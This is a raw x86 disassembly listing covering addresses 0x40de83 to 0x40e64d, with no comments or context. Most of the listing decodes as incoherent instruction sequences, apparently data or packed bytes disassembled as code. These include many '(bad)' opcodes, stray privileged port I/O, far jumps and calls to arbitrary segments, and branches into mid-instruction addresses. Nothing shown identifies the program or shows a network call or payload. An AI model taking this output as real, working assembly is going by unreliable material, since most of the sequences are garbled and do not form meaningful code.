  40de83:	and    al,0xf6
  40de85:	adc    DWORD PTR [esi],eax
  40de87:	xor    DWORD PTR [ebp+0x14313080],esi
  40de8d:	xchg   esi,eax
  40de8e:	ret    
  40de8f:	adc    dl,BYTE PTR [ebx+eax*4]
  40de92:	cmp    edi,DWORD PTR [eax-0x70]
  40de95:	add    eax,0xaacfc4b4
  40de9a:	inc    ebx
  40de9b:	dec    ebp
  40de9c:	mov    eax,0x6b622fc
  40dea1:	jle    0x40de63
  40dea3:	jae    0x40df11
  40dea5:	pop    esp
  40dea6:	outs   dx,DWORD PTR ds:[esi]
  40dea7:	scas   eax,DWORD PTR es:[edi]
  40dea8:	mov    eax,ds:0x2476d631
  40dead:	dec    eax
  40deae:	sbb    cl,0x81
  40deb1:	scas   eax,DWORD PTR es:[edi]
  40deb2:	sbb    eax,0xbc5b7cee
  40deb7:	mov    esi,0xc5058c6e
  40debc:	mov    eax,ds:0x99387bee
  40dec1:	fnstsw WORD PTR [eax+eax*2+0x3c00a4da]
  40dec8:	js     0x40de9e
  40deca:	add    dl,BYTE PTR [bx-0x14]
  40dece:	dec    esi
  40decf:	jmp    0xba1050f
  40ded4:	outs   dx,DWORD PTR ds:[esi]
  40ded5:	jg     0x40df3c
  40ded7:	jge    0x40de80
  40ded9:	sti    
  40deda:	xchg   edi,eax
  40dedb:	cmp    BYTE PTR [eax+edi*1-0x6f],ch
  40dedf:	xchg   edx,eax
  40dee0:	je     0x40de7f
  40dee2:	cmp    ecx,DWORD PTR ds:0xc856e3ad
  40dee8:	pop    esi
  40dee9:	adc    dh,BYTE PTR [eax-0x43a6384]
  40deef:	xlat   BYTE PTR ds:[ebx]
  40def0:	sbb    DWORD PTR [eax],ecx
  40def2:	and    dh,dh
  40def4:	cld    
  40def5:	clc    
  40def6:	jge    0x40df3b
  40def8:	lahf   
  40def9:	ror    BYTE PTR [eax-0x64fa1d98],1
  40deff:	sub    al,0x37
  40df01:	mov    bl,0x69
  40df03:	sbb    esp,ebx
  40df05:	pop    ebp
  40df06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df07:	jp     0x40defa
  40df09:	adc    BYTE PTR [edx-0x3f],0x9a
  40df0d:	mov    cl,0x46
  40df0f:	or     BYTE PTR [ecx+0x44],bl
  40df12:	sub    eax,0x6d960963
  40df17:	mov    ecx,0xe2b18dfa
  40df1c:	out    dx,eax
  40df1d:	fmulp  st(3),st
  40df1f:	sub    al,0x6e
  40df21:	mov    ecx,0x8fb2c0e8
  40df26:	inc    ebp
  40df27:	sbb    eax,0xda81187c
  40df2c:	cmp    eax,0x9f95628b
  40df31:	jae    0x40df15
  40df33:	inc    ebx
  40df34:	retf   
  40df35:	mov    gs,WORD PTR [ecx-0x72]
  40df38:	inc    edx
  40df39:	mov    cl,0xd6
  40df3b:	cld    
  40df3c:	mov    al,0xc9
  40df3e:	push   ecx
  40df3f:	pop    ebx
  40df40:	cli    
  40df41:	icebp  
  40df42:	cdq    
  40df43:	inc    ecx
  40df44:	test   eax,0x629db791
  40df49:	inc    ebx
  40df4a:	mov    dh,0x35
  40df4c:	xchg   esp,eax
  40df4d:	mov    edx,0xbb3a502f
  40df52:	pop    edi
  40df53:	idiv   DWORD PTR [ebx]
  40df55:	fldl2t 
  40df57:	aad    0xe2
  40df59:	add    esp,DWORD PTR [edx]
  40df5b:	dec    ebp
  40df5c:	mov    ds:0x478e959a,eax
  40df61:	sbb    eax,0xd5d4ad36
  40df66:	fld    DWORD PTR [eax]
  40df68:	in     al,dx
  40df69:	popa   
  40df6a:	loope  0x40dfa4
  40df6c:	dec    edi
  40df6d:	jo     0x40dfa2
  40df6f:	mov    al,0x62
  40df71:	mov    ds:0x6830e828,al
  40df76:	sti    
  40df77:	sub    ebx,ecx
  40df79:	xchg   ebx,ecx
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	shl    esp,1
  40dfa8:	xchg   ebx,eax
  40dfa9:	pop    es
  40dfaa:	pop    ebp
  40dfab:	xchg   DWORD PTR [edi+0x7f3f7e7e],eax
  40dfb1:	jle    0x40e031
  40dfb3:	xchg   edx,eax
  40dfb4:	inc    edi
  40dfb5:	icebp  
  40dfb6:	sbb    edi,DWORD PTR [edi]
  40dfb8:	jmp    0x679:0xf349526b
  40dfbf:	call   0x146b:0x8b53ddc5
  40dfc6:	and    bh,ch
  40dfc8:	lahf   
  40dfc9:	(bad)  
  40dfcb:	ret    
  40dfcc:	not    BYTE PTR [ebx+0x7aad2b39]
  40dfd2:	add    edx,DWORD PTR [esi+0x74]
  40dfd5:	shr    edx,1
  40dfd7:	jo     0x40dfe6
  40dfd9:	(bad)  
  40dfda:	frstor [ecx]
  40dfdc:	mov    ebx,0xf6bb2ae5
  40dfe1:	bound  ebx,QWORD PTR [eax]
  40dfe3:	imul   edx,DWORD PTR [ecx-0x1b9fba46],0x2f
  40dfea:	cmp    bx,bx
  40dfed:	mov    BYTE PTR [ecx+0x448c0694],dh
  40dff3:	dec    esp
  40dff4:	(bad)  
  40dff5:	mov    ecx,0xae3283e
  40dffa:	push   esp
  40dffb:	bound  edx,QWORD PTR [edx+0x20]
  40dffe:	(bad)  
  40dfff:	and    esi,DWORD PTR [esi+0x5542775e]
  40e005:	ja     0x40df99
  40e007:	and    dl,BYTE PTR [esi-0x25ea044b]
  40e00d:	inc    ecx
  40e00e:	lahf   
  40e00f:	mov    al,ds:0xfb575bd2
  40e014:	jns    0x40df9d
  40e016:	call   0x44bf9ffa
  40e01b:	int3   
  40e01c:	out    dx,eax
  40e01d:	inc    edx
  40e01e:	cmp    ebx,edi
  40e020:	pop    ecx
  40e021:	xchg   esp,eax
  40e022:	push   esp
  40e023:	push   edx
  40e024:	pop    esi
  40e025:	pop    esp
  40e026:	pop    ebp
  40e027:	push   ebx
  40e028:	retf   
  40e029:	scas   eax,DWORD PTR es:[edi]
  40e02a:	dec    ecx
  40e02b:	push   es
  40e02c:	xor    BYTE PTR [ebx],cl
  40e02e:	sub    BYTE PTR [ebp+0x1fbe2e15],dh
  40e034:	dec    ecx
  40e035:	cmp    bl,BYTE PTR [eax+0x569faf74]
  40e03b:	inc    esi
  40e03c:	(bad)  [ecx]
  40e03e:	mov    DWORD PTR [edx+0x1475d07a],ecx
  40e044:	in     eax,0xee
  40e046:	lock das 
  40e048:	sub    al,0xe8
  40e04a:	ja     0x40e077
  40e04c:	lods   eax,DWORD PTR ds:[esi]
  40e04d:	stc    
  40e04e:	shl    BYTE PTR [ecx-0x26cbd782],0xf8
  40e055:	xchg   ebp,eax
  40e056:	cmp    bl,cl
  40e058:	loope  0x40e099
  40e05a:	push   esp
  40e05b:	mov    DWORD PTR [edx-0x766daa2d],esp
  40e061:	push   ss
  40e062:	inc    esp
  40e063:	jo     0x40e078
  40e065:	imul   edx,DWORD PTR [edi+0x1b315aa4],0x5f
  40e06c:	imul   esi,DWORD PTR [edx],0xd14a4aee
  40e072:	ror    BYTE PTR [ecx-0x75],cl
  40e075:	add    al,BYTE PTR [eax+0x39]
  40e078:	and    bh,dl
  40e07a:	xor    DWORD PTR [ebp+0x64],esi
  40e07d:	out    0xa2,eax
  40e07f:	pop    eax
  40e080:	lods   eax,DWORD PTR ds:[esi]
  40e081:	out    0xff,eax
  40e083:	jnp    0x40e0c9
  40e085:	add    al,0x3
  40e087:	add    eax,0xbc5ade83
  40e08c:	ja     0x40e034
  40e08e:	test   bh,ch
  40e090:	xor    ecx,DWORD PTR [ecx-0x64]
  40e093:	test   DWORD PTR [edx],esp
  40e095:	test   BYTE PTR [ecx+0x31],bl
  40e098:	mov    ecx,0x6cae5579
  40e09d:	pop    ss
  40e09e:	dec    ecx
  40e09f:	aad    0x16
  40e0a1:	sub    al,ch
  40e0a3:	outs   dx,DWORD PTR ds:[esi]
  40e0a4:	call   0xd4a9:0xe630d063
  40e0ab:	stos   BYTE PTR es:[edi],al
  40e0ac:	adc    ah,al
  40e0ae:	sbb    al,0x79
  40e0b0:	mov    ebp,0xf5f72207
  40e0b5:	aaa    
  40e0b6:	vorps  ymm3,ymm6,YMMWORD PTR [eax+0x6297c00d]
  40e0be:	lea    esi,[esi]
  40e0c0:	frstor [eax-0x72f46678]
  40e0c6:	std    
  40e0c7:	shrd   DWORD PTR [edx+0x2930ce24],ebp,0xac
  40e0cf:	jmp    0x40e0ad
  40e0d1:	psubusb mm2,mm3
  40e0d4:	pop    ebp
  40e0d5:	lds    ebx,FWORD PTR [edx+0x17]
  40e0d8:	xor    DWORD PTR ds:[edx],ebx
  40e0db:	cmp    BYTE PTR [eax+0x3e],ch
  40e0de:	fucom  st(5)
  40e0e0:	jecxz  0x40e078
  40e0e2:	mov    BYTE PTR [ecx+0x71],bh
  40e0e5:	mov    dl,0xaa
  40e0e7:	and    dl,BYTE PTR [ebx-0x2fb21415]
  40e0ed:	mov    cl,0x18
  40e0ef:	aad    0x90
  40e0f1:	jno    0x40e083
  40e0f3:	out    dx,al
  40e0f4:	mov    eax,DWORD PTR [ebp-0xc]
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
